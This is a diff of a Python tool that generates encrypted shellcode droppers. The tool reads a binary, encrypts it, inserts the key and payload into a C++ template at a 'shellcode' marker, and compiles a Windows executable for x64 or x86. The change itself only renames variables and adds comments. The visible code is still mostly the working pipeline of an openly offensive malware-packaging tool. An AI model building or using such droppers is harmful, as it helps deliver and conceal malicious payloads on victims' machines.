@@ -9,9 +9,11 @@ from colorama import Fore
 import argparse
 from distutils.spawn import find_executable
 
+# Global Variables
 SHELLCODE_MARK = "Insert Shellcode Here"
-archs = {"1":"x64", "2":"x86"}
-data = []
+ARCHS = {"1":"x64", "2":"x86"}
+DATA = []
+REV_LIST = ['','','']
 
 def printS(text):
     print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
@@ -80,30 +82,35 @@ def main():
     binaryName = binaryPath.split('/')[-1]
     outputFileName = (binaryPath.split('/')[-1]).split('.')[0]
     check_requirements() 
+    
+    # Check for Unsupported ARCH
     try:
-        Arch = archs[args.arch]
+        Arch = ARCHS[args.arch]
     except KeyError:
         printE("Invalid Arch...!")
         parser.print_help()
         sys.exit(1)
 
     # Encrypting provided binary
+    # Checking For Binary File
     try:
         binaryData = open(binaryPath, "rb").read()
     except FileNotFoundError:
         printE("No such file in directory!")
         sys.exit(1)
 
+    
+    # Starting to Generate
     printI(f"Generating {Arch} Dropper for {binaryName}\n")
     
     # Encrypt shellcode
     binaryKey, binaryPayload = encrypt(binaryData)
     
     # Write data to cpp code
-    data.append(rf"// {binaryName}-{Arch}")
-    data.append(f"unsigned char key[] = {binaryKey}")
-    data.append(f"unsigned char shellcode[] = {binaryPayload}")
-    writeToFile(SHELLCODE_MARK, data)
+    DATA.append(rf"// {binaryName}-{Arch}")
+    DATA.append(f"unsigned char key[] = {binaryKey}")
+    DATA.append(f"unsigned char shellcode[] = {binaryPayload}")
+    writeToFile(SHELLCODE_MARK, DATA)
     
     # Compiling Code
     if Arch == "x64":
@@ -119,8 +126,7 @@ def main():
     printS(f"Executable saved to output/{outputFileName}.exe")
     
     # Cleaing up!
-    revertList = ['','','']
-    writeToFile(SHELLCODE_MARK, revertList)
+    writeToFile(SHELLCODE_MARK, REV_LIST)
 
 
 if __name__ == "__main__":
